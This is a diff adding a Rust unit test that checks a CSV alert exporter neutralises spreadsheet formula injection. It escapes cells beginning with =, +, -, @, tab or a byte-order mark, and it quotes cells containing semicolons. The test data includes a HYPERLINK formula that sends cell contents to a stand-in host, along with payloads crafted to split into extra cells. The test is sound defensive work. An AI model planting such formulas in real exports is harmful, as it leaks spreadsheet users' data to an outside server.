@@ -77,3 +77,44 @@ fn json_is_pretty_array_in_wire_format() {
     assert_eq!(back[1]["remote"], serde_json::Value::Null);
     assert!(out.contains('\n'), "lesbar formatiert");
 }
+
+/// A file name off a watched share is attacker input. A cell that starts with
+/// a formula trigger gets a leading `'`, so a spreadsheet shows it as text;
+/// quoting alone does not stop the evaluation. A `;` or TAB forces quotes, so
+/// a semicolon-dialect import cannot split the cell.
+#[test]
+fn csv_defuses_formula_triggers() {
+    let mut a = alerts().remove(0);
+    a.identity = ProcessIdentity::Unknown { path: "/tmp/@SUM(A1)".into() };
+    a.files = vec![r#"=HYPERLINK("http://x/?d="&A1,"click")"#.into()];
+    a.via = Some("a;b".into());
+    let out = export::csv(&[a]);
+    assert_eq!(
+        out.lines().nth(1).unwrap(),
+        r#"1,2026-09-05T15:44:45.179509Z,'@SUM(A1),/tmp/@SUM(A1) [unsigned],39416,100.59.99.192,443,201438,"'=HYPERLINK(""http://x/?d=""&A1,""click"")","a;b",new,"#
+    );
+    for (reason, cell) in [
+        ("=1+1", "'=1+1"),
+        ("+1", "'+1"),
+        ("-1", "'-1"),
+        ("@SUM(A1)", "'@SUM(A1)"),
+        ("\t1", "\"'\t1\""),
+        ("\r1", "\"'\r1\""),
+        ("\u{feff}=1", "'\u{feff}=1"),
+        ("a\tb", "\"a\tb\""),
+        ("a\r\nb", "\"a\r\nb\""),
+        ("a-b=c", "a-b=c"),
+        // A `;`, TAB or line break is where a `;`-locale spreadsheet starts
+        // a new cell, our quotes notwithstanding.
+        (" =1", "' =1"),
+        ("x;=1+1;y", "\"x;'=1+1;y\""),
+        ("a; -1", "\"a;' -1\""),
+        ("a\t@b", "\"a\t'@b\""),
+        ("a\n=1", "\"a\n'=1\""),
+    ] {
+        let mut a = alerts().remove(0);
+        a.reason = Some(reason.into());
+        let out = export::csv(&[a]);
+        assert!(out.ends_with(&format!(",new,{cell}\n")), "{reason:?} -> {out:?}");
+    }
+}
